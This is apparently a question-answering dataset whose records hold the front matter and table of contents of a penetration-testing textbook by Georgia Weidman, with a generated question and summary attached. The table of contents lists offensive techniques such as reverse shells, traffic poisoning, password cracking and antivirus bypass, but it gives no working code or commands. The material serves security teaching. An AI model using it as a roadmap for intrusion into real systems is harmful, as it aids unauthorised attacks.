[
  {
    "start": 1,
    "end": 4,
    "text": "Penetration testing\nP e n e t r a t i o n\nt e s t i n g\na Hands-on introduction\nto Hacking\nby Georgia Weidman\nSan Francisco\nPenetration testing. Copyright © 2014 by Georgia Weidman.\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic\nor mechanical, including photocopying, recording, or by any information storage or retrieval system, without the\nprior written permission of the copyright owner and the publisher.\nPrinted in USA\nFirst printing\n18 17 16 15 14 1 2 3 4 5 6 7 8 9\n\nISBN-10: 1-59327-564-1\n\nISBN-13: 978-1-59327-564-8\nPublisher: William Pollock\nProduction Editor: Alison Law\nCover Illustration: Mertsaloff/Shutterstock\nInterior Design: Octopod Studios\nDevelopmental Editor: William Pollock\nTechnical Reviewer: Jason Oliver\nCopyeditor: Pamela Hunt\nCompositor: Susan Glinert Stevens\nProofreader: James Fraleigh\nIndexer: Nancy Guenther\nFor information on distribution, translations, or bulk sales, please contact No Starch Press, Inc. directly:\nNo Starch Press, Inc.\n245 8th Street, San Francisco, CA 94103\nphone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nWeidman, Georgia.\nPenetration testing : a hands-on introduction to hacking / Georgia Weidman.\npages cm\nIncludes index.\nISBN 978-1-59327-564-8 (paperback) -- ISBN 1-59327-564-1 (paperback)\n1. Penetration testing (Computer security) 2. Kali Linux. 3. Computer hackers. I. Title.\n\nQA76.9.A25W4258 2014\n\n005.8'092--dc23\n2014001066\nNo Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and\ncompany names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark\nsymbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to\nthe benefit of the trademark owner, with no intention of infringement of the trademark. The information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been\ntaken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any\nperson or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the infor-\nmation contained in it. In memory of Jess Hilden\nAbout the Author\nGeorgia Weidman is a penetration tester and\nresearcher, as well as the founder of Bulb\nSecurity, a security consulting firm. She pre­\nsents at conferences around the world includ­\ning Black Hat, ShmooCon, and DerbyCon, and\nteaches classes on topics such as penetration\ntesting, mobile hacking, and exploit develop­\nment. Her work in mobile security has been\nfeatured in print and on television internation­\nally. She was awarded a DARPA Cyber Fast\nTrack grant to continue her work in mobile\ndevice security. © Tommy Phillips Photography\nBrief Contents\nForeword by Peter Van Eeckhoutte . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xix\nAcknowledgments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiii\nIntroduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxv\nChapter 0: Penetration Testing Primer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .1\nPart I: the BasIcs\nChapter 1: Setting Up Your Virtual Lab . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .9\nChapter 2: Using Kali Linux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .55\nChapter 3: Programming  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .75\nChapter 4: Using the Metasploit Framework  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .87\nPart II: assessments\nChapter 5: Information Gathering  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .113\nChapter 6: Finding Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .133\nChapter 7: Capturing Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .155\nPart III: attacks\nChapter 8: Exploitation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .179\nChapter 9: Password Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .197\nChapter10: Client-Side Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .215\nChapter 11: Social Engineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .243\nChapter 12: Bypassing Antivirus Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .257\nChapter 13: Post Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .277\nChapter 14: Web Application Testing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .313\nChapter 15: Wireless Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .339\nPart IV: exPloIt DeVeloPment\nChapter 16: A Stack-Based Buffer Overflow in Linux  . . . . . . . . . . . . . . . . . . . . . . . . . . .361\nChapter 17: A Stack-Based Buffer Overflow in Windows  . . . . . . . . . . . . . . . . . . . . . . . .379\nChapter 18: Structured Exception Handler Overwrites  . . . . . . . . . . . . . . . . . . . . . . . . . .401\nChapter 19: Fuzzing, Porting Exploits, and Metasploit Modules . . . . . . . . . . . . . . . . . . . .421\nPart V: moBIle hackInG\nChapter 20: Using the Smartphone Pentest Framework  . . . . . . . . . . . . . . . . . . . . . . . . .445\nResources  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .473\nIndex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .477\nviii Brief Contents\nContents in De tail\nForeword by Peter Van eeckhoutte xix\naCknowLedgments xxiii\nintroduCtion xxv\nA Note of Thanks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxvi\nAbout This Book . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxvi\nPart I: The Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii\nPart II: Assessments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii\nPart III: Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii\nPart IV: Exploit Development . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxviii\nPart V: Mobile Hacking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxviii\n0\nPenetration testing Primer 1\nThe Stages of the Penetration Test  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\nPre-engagement  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\nInformation Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nThreat Modeling . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nVulnerability Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nExploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nPost Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nReporting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\nPart i\nthe BasiCs\n1\nsetting uP Your VirtuaL LaB 9\nInstalling VMware  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nSetting Up Kali Linux  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\nConfiguring the Network for Your Virtual Machine  . . . . . . . . . . . . . . . . . . . . 13\nInstalling Nessus . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\nInstalling Additional Software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nSetting Up Android Emulators  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22\nSmartphone Pentest Framework . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\nTarget Virtual Machines  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n\n. . . . . . . . . . 28\nCreating the Windows XP Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nVMware Player on Microsoft Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nVMware Fusion on Mac OS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\nInstalling and Activating Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\nInstalling VMware Tools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\nTurning Off Windows Firewall  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nSetting User Passwords  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nSetting a Static IP Address  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nMaking XP Act Like It’s a Member of a Windows Domain  . . . . . . . . . . . . . . . 39\nInstalling Vulnerable Software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\nInstalling Immunity Debugger and Mona  . . . . . . . . . . . . . . . . . . . . . . . . . . . 46\nSetting Up the Ubuntu 8 .10 Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\nCreating the Windows 7 Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\nCreating a User Account  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\nOpting Out of Automatic Updates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50\nSetting a Static IP Address  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51\nAdding a Second Network Interface  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\nInstalling Additional Software . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\n2\nusing kaLi Linux 55\nLinux Command Line  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nThe Linux Filesystem  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nChanging Directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nLearning About Commands: The Man Pages . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57\nUser Privileges . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nAdding a User  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nAdding a User to the sudoers File  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\nSwitching Users and Using sudo . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\nCreating a New File or Directory  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60\nCopying, Moving, and Removing Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60\nAdding Text to a File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nAppending Text to a File  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nFile Permissions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nEditing Files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62\nSearching for Text . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nEditing a File with vi  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nData Manipulation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64\nUsing grep . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nUsing sed . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nPattern Matching with awk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nManaging Installed Packages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nProcesses and Services . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nManaging Networking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nSetting a Static IP Address  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\nViewing Network Connections  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nNetcat: The Swiss Army Knife of TCP/IP Connections . . . . . . . . . . . . . . . . . . . . . . . . . 69\nCheck to See If a Port Is Listening  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nOpening a Command Shell Listener . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nPushing a Command Shell Back to a Listener  . . . . . . . . . . . . . . . . . . . . . . . . 71\nAutomating Tasks with cron Jobs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73\nx Contents in Detail\n3\nProgramming 75\nBash Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 75\nPing  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76\nA Simple Bash Script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76\nRunning Our Script  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nAdding Functionality with if Statements  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nA for Loop  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78\nStreamlining the Results  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79\nPython Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 81\nConnecting to a Port  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83\nif Statements in Python . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83\nWriting and Compiling C Programs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84\nSummary  . . . . . . . . . . . . . . . . .\n\n. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\n4\nusing the metasPLoit Framework 87\nStarting Metasploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\nFinding Metasploit Modules . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nThe Module Database . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nBuilt-In Search . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91\nSetting Module Options  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94\n\nRHOST  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94\n\nRPORT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95",
    "question": "What is the main purpose and focus of the book \"Penetration Testing: A Hands-on Introduction to Hacking\" by Georgia Weidman?",
    "summary": "\"Penetration Testing: A Hands-On Introduction to Hacking\" by Georgia Weidman is a guide to learning how to identify and exploit security vulnerabilities in computer systems. The book covers the fundamentals of penetration testing, including setup, tools like Kali Linux and Metasploit, and various attack techniques. It also includes chapters on mobile hacking and exploit development, providing practical examples and step-by-step instructions for readers to gain hands-on experience in ethical hacking."
  },
  {
    "start": 5,
    "end": 7,
    "text": "SMBPIPE  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95\nExploit Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95\nPayloads (or Shellcode)  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96\nFinding Compatible Payloads . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96\nA Test Run  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 97\nTypes of Shells . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nBind Shells . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nReverse Shells . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nSetting a Payload Manually . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 99\nMsfcli . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101\nGetting Help . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101\nShowing Options  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101\nPayloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102\nCreating Standalone Payloads with Msfvenom . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103\nChoosing a Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nSetting Options . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nChoosing an Output Format . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nServing Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nUsing the Multi/Handler Module . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nUsing an Auxiliary Module  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 109\nContents in Detail xi\nPart ii\nassessments\n5\ninFormation gathering 113\nOpen Source Intelligence Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nNetcraft . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114\nWhois Lookups . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115\nDNS Reconnaissance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116\nSearching for Email Addresses  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 118\nMaltego . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119\nPort Scanning  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 123\nManual Port Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124\nPort Scanning with Nmap  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 132\n6\nFinding VuLneraBiLities 133\nFrom Nmap Version Scan to Potential Vulnerability  . . . . . . . . . . . . . . . . . . . . . . . . . 133\nNessus  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nNessus Policies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nScanning with Nessus  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138\nA Note About Nessus Rankings  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140\nWhy Use Vulnerability Scanners? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\nExporting Nessus Results  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\nResearching Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142\nThe Nmap Scripting Engine . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142\nRunning a Single NSE Script  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nMetasploit Scanner Modules  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 146\nMetasploit Exploit Check Functions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 147\nWeb Application Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\nNikto . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nAttacking XAMPP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nDefault Credentials  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 150\nManual Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nExploring a Strange Port  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nFinding Valid Usernames . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153\n7\nCaPturing traFFiC 155\nNetworking for Capturing Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nUsing Wireshark  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nCapturing Traffic  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nFiltering Traffic  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 158\nFollowing a TCP Stream . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nDissecting Packets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n\n160\nxii Contents in Detail\nARP Cache Poisoning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160\nARP Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 161\nIP Forwarding . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163\nARP Cache Poisoning with Arpspoof . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164\nUsing ARP Cache Poisoning to Impersonate the Default Gateway  . . . . . . . . . 165\nDNS Cache Poisoning  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 167\nGetting Started . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168\nUsing Dnsspoof . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 169\nSSL Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nSSL Basics  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nUsing Ettercap for SSL Man-in-the-Middle Attacks  . . . . . . . . . . . . . . . . . . . . 171\nSSL Stripping . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173\nUsing SSLstrip . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175\nPart III\nattacks\n8\nExPloItatIon 179\nRevisiting MS08-067  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nMetasploit Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nMeterpreter  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181\nExploiting WebDAV Default Credentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182\nRunning a Script on the Target Web Server  . . . . . . . . . . . . . . . . . . . . . . . . 183\nUploading a Msfvenom Payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nExploiting Open phpMyAdmin  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186\nDownloading a File with TFTP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 187\nDownloading Sensitive Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nDownloading a Configuration File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nDownloading the Windows SAM  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189\nExploiting a Buffer Overflow in Third-Party Software . . . . . . . . . . . . . . . . . . . . . . . . . 190\nExploiting Third-Party Web Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 191\nExploiting a Compromised Service . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 193\nExploiting Open NFS Shares . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 194\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 196\n9\nPassword attacks 197\nPassword Management . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 197\nOnline Password Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 198\nWordlists . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199\nGuessing Usernames and Passwords with Hydra  . . . . . . . . . . . . . . . . . . . . 202\nOffline Password Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nRecovering Password Hashes from a Windows SAM File . . . . . . . . . . . . . . . 204\nDumping Password Hashes with Physical Access . . . . . . . . . . . . . . . . . . . . . 206\nLM vs . NTLM Hashing Algorithms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\nThe Trouble with LM Password Hashes . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nContents in Detail xiii\nJohn the Ripper . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nCracking Linux Passwords  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nCracking Configuration File Passwords  . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nRainbow Tables  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nOnline Password-Cracking Services . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nDumping Plaintext Passwords from Memory with Windows Credential Editor  . . . . . . . 213\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 214\n10\nCLient-side exPLoitation 215\nBypassing Filters with Metasploit Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nAll Ports . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nHTTP and HTTPS Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nClient-Side Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nBrowser Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219\nPDF Exploits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225\nJava Exploits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 230\nbrowser_autopwn . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 235\nWinamp  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 237\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 240\n11\nsoCiaL engineering 243\nThe Social-Engineer Toolkit  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\nSpear-Phishing Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245\nChoosing a Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 246\nSetting Options . . . . . . . . . . . . . . . . . . . . . . .\n\n. . . . . . . . . . . . . . . . . . . . . 247\nNaming Your File  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 247\nSingle or Mass 